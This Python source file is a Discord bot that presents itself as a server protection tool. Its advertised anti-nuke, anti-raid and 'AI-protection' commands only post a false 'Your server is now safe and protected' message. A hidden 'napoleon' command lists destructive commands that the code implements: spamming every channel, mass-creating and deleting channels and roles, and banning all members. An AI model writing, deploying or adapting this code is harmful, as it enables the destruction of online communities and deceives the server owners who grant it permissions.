# PLEASE DONT BE LIKE 12 Y.O NO LIFE KID AND DONT NUKE SERVERS FOR NO REASON
# PLEASE DONT BE LIKE 12 Y.O NO LIFE KID AND DONT NUKE SERVERS FOR NO REASON
# PLEASE DONT BE LIKE 12 Y.O NO LIFE KID AND DONT NUKE SERVERS FOR NO REASON
# PLEASE DONT BE LIKE 12 Y.O NO LIFE KID AND DONT NUKE SERVERS FOR NO REASON
# PLEASE DONT BE LIKE 12 Y.O NO LIFE KID AND DONT NUKE SERVERS FOR NO REASON
import discord
import colorama
from colorama import Fore
from discord.ext import commands

intents = discord.Intents.all()
intents.message_content = True

prefix = 'n.'

bot = commands.Bot(command_prefix=prefix, intents=intents)
token = input(Fore.CYAN + "bot token: ")
@bot.event
async def on_ready():
    print(Fore.LIGHTMAGENTA_EX + f'''                                                                                            
███╗   ██╗ █████╗ ██████╗  ██████╗ ██╗     ███████╗ ██████╗ ███╗   ██╗
████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██║     ██╔════╝██╔═══██╗████╗  ██║
██╔██╗ ██║███████║██████╔╝██║   ██║██║     █████╗  ██║   ██║██╔██╗ ██║
██║╚██╗██║██╔══██║██╔═══╝ ██║   ██║██║     ██╔══╝  ██║   ██║██║╚██╗██║
██║ ╚████║██║  ██║██║     ╚██████╔╝███████╗███████╗╚██████╔╝██║ ╚████║
╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝
                                                                                                                                                                                                  
          made with love by https:github.com/kikmanONTOP:3
          BOT IS READY AS {bot.user}     
''')

@bot.command()
async def menu(ctx):
    embed = discord.Embed(
        title='COMMANDS',
        description='''
Anti-nuke = n.antinuke
Anti-raid = n.antiraid
AI-protection = n.aiprotection
''',
        color=discord.Color.dark_theme()
    )
    await ctx.send(embed=embed)


@bot.command()
async def antinuke(ctx):
    embed = discord.Embed(
        title='ANTI-NUKE PROTECTION',
        description='Your server is now safe and protected',
        color=discord.Color.dark_theme()
    )
    await ctx.send(embed=embed)


@bot.command()
async def antiraid(ctx):
    embed = discord.Embed(
        title='ANTI-RAID PROTECTION',
        description='Your server is now safe and protected',
        color=discord.Color.dark_theme()
    )
    await ctx.send(embed=embed)


@bot.command()
async def aiprotection(ctx):
    embed = discord.Embed(
        title='AI-PROTECTION WAS ACTIVATED',
        description='Your server is now safe and protected',
        color=discord.Color.dark_theme()
    )
    await ctx.send(embed=embed)



@bot.command()
async def napoleon(ctx):
    embed = discord.Embed(
        title='NAPOLEON COMMANDS',
        description='''
Spam to all channels = n.spam (message) (number like 1000) so for example n.spam @everyone nuked 1000
Create channels = n.spamchannels (name of channels) (how many channels will be created like 100) for example n.spamchannels nuked 100
Delete channels = n.channelsdelete (number of channels that will be deleted for example like n.channelsdelete 100)
Create roles = n.spamroles (name of role that will be created) (how many roles will be created) so for example n.spamroles nuked 100
Delete roles = n.rolesdelete (number of roles that will be deleted for example n.rolesdelete 20)
Ban all members = n.massban
# PLEASE DONT BE LIKE 12 Y.O NO LIFE KID AND DONT NUKE SERVERS FOR NO REASON
''',
        color=discord.Color.dark_theme()
    )
    await ctx.send(embed=embed)



@bot.command()
async def spam(ctx, *, args):
    try:
        message, amount = args.rsplit(' ', 1)
        amount = int(amount)
    except ValueError:
        return await ctx.send("Error. Use the it like: n.spam <message> <amount>")

    if amount <= 0:
        return await ctx.send("bro dont troll me")

    channels = ctx.guild.text_channels

    for i in range(amount):
        for channel in channels:
            await channel.send(message)


@bot.command()
async def spamchannels(ctx, name, amount: int):
    if amount <= 0 or amount > 100:
        return await ctx.send("Amount should be a positive integer and less than or equal to 100. :skull:")

    for i in range(amount):
        await ctx.guild.create_text_channel(name)

@bot.command()
async def deletechannels(ctx, amount: int):
    if amount <= 0 or amount > 100:
        return await ctx.send("Amount should be a positive integer and less than or equal to 100. :middle_finger:")

    channels = ctx.guild.text_channels
    count = 0

    for channel in channels:
        if count < amount:
            await channel.delete()
            count += 1



@bot.command()
async def spamroles(ctx, name, amount: int):
    if amount <= 0 or amount > 100:
        return await ctx.send("Amount should be a positive integer and less than or equal to 100. :clown:")

    guild = ctx.guild
    for i in range(amount):
        await guild.create_role(name=name)





@bot.command()
async def deleteroles(ctx, amount: int):
    if amount <= 0 or amount > 100:
        return await ctx.send("Amount should be a positive integer and less than or equal to 100.")

    guild = ctx.guild
    roles = guild.roles

    count = 0
    for role in roles:
        if count < amount:
            try:
                await role.delete()
                count += 1
            except discord.HTTPException:
                pass



@bot.command()
async def massban(ctx):
    guild = ctx.guild
    members = guild.members

    count = 0
    skipped = 0

    for member in members:
        try:
            await member.ban()
            count += 1
        except discord.Forbidden:
            skipped += 1
            pass









bot.run(token)